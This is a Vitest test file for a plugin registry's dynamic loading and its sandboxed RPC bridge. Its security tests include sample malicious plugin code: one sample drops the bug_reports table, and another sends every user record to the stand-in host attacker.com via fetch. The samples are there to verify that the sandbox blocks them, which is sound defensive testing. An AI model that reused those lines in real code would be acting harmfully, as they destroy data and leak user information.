/**
 * Plugin Registry - Dynamic Plugin Loading Tests
 * Tests the fallback strategy: memory → filesystem → database
 */

import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import { PluginRegistry } from '../../src/integrations/plugin-registry.js';
import { createDatabaseClient } from '../../src/db/client.js';
import type { DatabaseClient } from '../../src/db/client.js';
import type { IStorageService } from '../../src/storage/types.js';

describe('PluginRegistry - Dynamic Loading', () => {
  let db: DatabaseClient;
  let mockStorage: IStorageService;
  let registry: PluginRegistry;

  beforeAll(async () => {
    db = createDatabaseClient();
    await db.testConnection();

    // Mock storage service
    mockStorage = {
      uploadScreenshot: vi.fn(),
      uploadReplay: vi.fn(),
      uploadAttachment: vi.fn(),
      getUrl: vi.fn(),
      deleteFile: vi.fn(),
    } as any;

    registry = new PluginRegistry(db, mockStorage);
  });

  afterAll(async () => {
    await db.close();
  });

  describe('loadDynamicPlugin()', () => {
    it('should return cached plugin if already loaded', async () => {
      // Register a test plugin
      const testPlugin = {
        metadata: {
          name: 'Test Plugin',
          platform: 'test_cached',
          version: '1.0.0',
          capabilities: [],
        },
        factory: () => ({
          createTicket: vi.fn(),
          updateTicket: vi.fn(),
          getTicket: vi.fn(),
        }),
      };

      await registry.register(testPlugin);

      // Load dynamically - should return cached version
      const service = await registry.loadDynamicPlugin('test_cached');
      expect(service).toBeDefined();
      expect(registry.isSupported('test_cached')).toBe(true);
    });

    it('should throw error for non-existent integration', async () => {
      await expect(registry.loadDynamicPlugin('nonexistent_integration')).rejects.toThrow(
        /not found/
      );
    });

    it('should attempt filesystem loading first', async () => {
      // This will fail since we don't have a real filesystem plugin
      // but it validates the error message shows filesystem was attempted
      await expect(registry.loadDynamicPlugin('fake_filesystem_plugin')).rejects.toThrow();
    });

    it('should check database after filesystem fails', async () => {
      // Create integration without plugin_code
      const integration = await db.integrations.create({
        type: 'test_db_integration',
        name: 'Test DB Integration',
        status: 'not_configured',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
      });

      // Should fail because no plugin_code and plugin not found
      await expect(registry.loadDynamicPlugin('test_db_integration')).rejects.toThrow(
        /not found|does not have plugin code/i
      );

      // Cleanup
      await db.integrations.delete(integration.id);
    });

    it('should reject database plugins with code execution disabled', async () => {
      // Create integration with plugin_code but execution disabled
      const integration = await db.integrations.create({
        type: 'test_disabled_execution',
        name: 'Test Disabled Execution',
        status: 'not_configured',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
        plugin_code: 'module.exports = { test: true };',
        allow_code_execution: false,
      });

      // Should fail - either because execution disabled or because it has plugin_code but failed
      await expect(registry.loadDynamicPlugin('test_disabled_execution')).rejects.toThrow();

      // Cleanup
      await db.integrations.delete(integration.id);
    });

    it('should execute database plugin with secure RPC bridge', async () => {
      // Create integration with valid plugin code
      const integration = await db.integrations.create({
        type: 'test_db_plugin',
        name: 'Test DB Plugin',
        status: 'not_configured',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
        plugin_code: `
          const pluginMetadata = {
            platform: 'test_db_plugin',
            name: 'Test DB Plugin',
            version: '1.0.0',
            description: 'Test plugin for RPC bridge validation'
          };

          function factory(context) {
            return {
              platform: 'test_db_plugin',
              async createFromBugReport(bugReport, config) {
                // Can only call whitelisted RPC methods
                return { success: true, external_id: bugReport.id };
              }
            };
          }

          module.exports = { metadata: pluginMetadata, factory };
        `,
        allow_code_execution: true,
      });

      // SECURITY: Should execute successfully with RPC restrictions
      const service = await registry.loadDynamicPlugin('test_db_plugin');
      expect(service).toBeDefined();
      expect(typeof service.createFromBugReport).toBe('function');

      // Cleanup
      await db.integrations.delete(integration.id);
    });
  });

  describe('Security - Custom Plugin Execution with RPC Bridge', () => {
    it('should execute plugin code with RPC restrictions', async () => {
      const integration = await db.integrations.create({
        type: 'security_test_plugin',
        name: 'Security Test',
        status: 'active',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
        plugin_code: `
          const pluginMetadata = {
            platform: 'security_test_plugin',
            name: 'Security Test Plugin',
            version: '1.0.0'
          };

          function factory(context) {
            return {
              platform: 'security_test_plugin',
              async createFromBugReport(bugReport, config) {
                // Only whitelisted RPC methods work
                return { success: true };
              }
            };
          }

          module.exports = { metadata: pluginMetadata, factory };
        `,
        allow_code_execution: true,
      });

      // Should execute successfully with RPC bridge
      const service = await registry.loadDynamicPlugin('security_test_plugin');
      expect(service).toBeDefined();
      expect(typeof service.createFromBugReport).toBe('function');

      await db.integrations.delete(integration.id);
    });

    it('should prevent direct database access via RPC restrictions', async () => {
      // This plugin tries direct database access - RPC bridge should block it
      const maliciousCode = `
        const pluginMetadata = {
          platform: 'malicious_plugin',
          name: 'Malicious Plugin',
          version: '1.0.0'
        };

        function factory(context) {
          return {
            platform: 'malicious_plugin',
            async createFromBugReport(bugReport, config) {
              // This will fail - db not accessible directly
              try {
                await context.db.query('DROP TABLE bug_reports CASCADE');
                return { success: false, error: 'Should have been blocked' };
              } catch (error) {
                // Expected - direct DB access blocked
                return { success: true, blocked: true };
              }
            }
          };
        }

        module.exports = { metadata: pluginMetadata, factory };
      `;

      const integration = await db.integrations.create({
        type: 'malicious_plugin',
        name: 'Malicious Plugin',
        status: 'active',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
        plugin_code: maliciousCode,
        allow_code_execution: true,
      });

      // Plugin executes but RPC bridge blocks unauthorized methods
      const service = await registry.loadDynamicPlugin('malicious_plugin');
      expect(service).toBeDefined();

      await db.integrations.delete(integration.id);
    });

    it('should prevent data exfiltration attempts', async () => {
      const exfiltrationCode = `
        const users = await context.db.users.findAll();
        await fetch('https://attacker.com/', { method: 'POST', body: JSON.stringify(users) });
        module.exports = { metadata: {}, factory: () => ({}) };
      `;

      const integration = await db.integrations.create({
        type: 'exfiltration_plugin',
        name: 'Exfiltration Plugin',
        status: 'active',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
        plugin_code: exfiltrationCode,
        allow_code_execution: true,
      });

      // SECURITY: Should be rejected
      await expect(registry.loadDynamicPlugin('exfiltration_plugin')).rejects.toThrow();

      await db.integrations.delete(integration.id);
    });

    it('should fail on invalid plugin code format', async () => {
      // Invalid format - missing factory function
      const integration = await db.integrations.create({
        type: 'clear_error_test',
        name: 'Clear Error Test',
        status: 'active',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
        plugin_code: 'const invalid = "no factory function";',
        allow_code_execution: true,
      });

      // Should fail with clear error about missing factory
      await expect(registry.loadDynamicPlugin('clear_error_test')).rejects.toThrow();

      await db.integrations.delete(integration.id);
    });
  });

  describe('Loading Strategy Validation', () => {
    it('should validate the complete fallback chain', async () => {
      const platform = 'validation_test_platform';

      // 1. Try loading without anything - should fail
      await expect(registry.loadDynamicPlugin(platform)).rejects.toThrow(/not found/i);

      // 2. Create minimal integration without plugin_code - should still fail
      const integration = await db.integrations.create({
        type: platform,
        name: 'Validation Test',
        status: 'not_configured',
        is_custom: true,
        plugin_source: 'filesystem',
        trust_level: 'custom',
      });

      await expect(registry.loadDynamicPlugin(platform)).rejects.toThrow(
        /not found|does not have plugin code/i
      );

      // Cleanup
      await db.integrations.delete(integration.id);
    });

    it('should normalize platform names to lowercase', async () => {
      const testPlugin = {
        metadata: {
          name: 'Case Test Plugin',
          platform: 'CaseSensitive',
          version: '1.0.0',
          capabilities: [],
        },
        factory: () => ({
          createTicket: vi.fn(),
          updateTicket: vi.fn(),
          getTicket: vi.fn(),
        }),
      };

      await registry.register(testPlugin);

      // Should find plugin regardless of case
      const service1 = await registry.loadDynamicPlugin('CASESENSITIVE');
      const service2 = await registry.loadDynamicPlugin('casesensitive');
      const service3 = await registry.loadDynamicPlugin('CaseSensitive');

      expect(service1).toBeDefined();
      expect(service2).toBeDefined();
      expect(service3).toBeDefined();
    });
  });
});
